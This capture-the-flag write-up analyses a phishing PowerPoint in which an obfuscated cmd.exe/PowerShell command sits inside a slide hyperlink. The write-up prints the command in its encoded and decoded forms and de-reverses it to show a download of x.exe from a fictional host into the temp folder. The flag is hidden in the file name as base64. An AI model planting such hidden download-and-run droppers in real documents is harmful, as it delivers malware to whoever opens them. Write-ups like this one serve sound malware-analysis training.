### Alienphish

#### Problem

- Given the Alien Weaknesses.pptx file, get the flag

#### Solution

- As we know that all .pptx files are actually a zip of many other files underneath.
- So, we rename it to .zip and extract the files.
- After going through all the files, we found a suspicious file - Alien Weaknesses/ppt/slides/\_rels/slide1_xml.rels, which contained a big string in target value of a hyperlink.
- So, we extracted the string and tried to get the flag.

`cmd.exe%20/V:ON/C%22set%20yM=%22o$%20eliftuo-%20exe.x/neila.htraeyortsed/:ptth%20rwi%20;'exe.99zP_MHMyNGNt9FM391ZOlGSzFDSwtnQUh0Q'%20+%20pmet:vne$%20=%20o$%22%20c-%20llehsrewop&amp;&amp;for%20/L%20%25X%20in%20(122;-1;0)do%20set%20kCX=!kCX!!yM:~%25X,1!&amp;&amp;if%20%25X%20leq%200%20call%20%25kCX:*kCX!=%25%22`

- The '%20' in between looked like URL encoded, so we decoded it out and replaced '\&amp;' with actual '&', we got the following string.
  `cmd.exe /V:ON/C"set yM="o$ eliftuo- exe.x/neila.htraeyortsed/:ptth rwi ;'exe.99zP_MHMyNGNt9FM391ZOlGSzFDSwtnQUh0Q' + pmet:vne$ = o$" c- llehsrewop&amp;&amp;for /L %X in (122;-1;0)do set kCX=!kCX!!yM:~%X,1!&amp;&amp;if %X leq 0 call %kCX:*kCX!=%"`

- Now, reading the string, we can figure out that some of its parts are reversed, ex : `eliftuo` : `outfile` , `exe.x/neila.htraeyortsed/:ptth` : `http:/destroyedearth.alien/x.exe`.
- So, we tried to figure out the exact string by reversing some parts and doing some other ops. We got the following strings.

```
cmd.exe /V:ON/C"set yM; iwr http:/destroyearth.alien/x.exe -outfile $o"='Q0hUQntwSDFzSGlOZ193MF9tNGNyMHM_Pz99.exe' + powershell -c "$o = $env:temp && for /L %X in (122;-1;0)do set kCX=!kCX!!yM:~%X,1!&&if %X leq 0 call %kCX:*kCX!=%"
```

- The filename looked confusing, so we tried base64 decoding it and got the flag.
- Flag : `CHTB{pH1sHiNg_w0_m4cr0s???}`
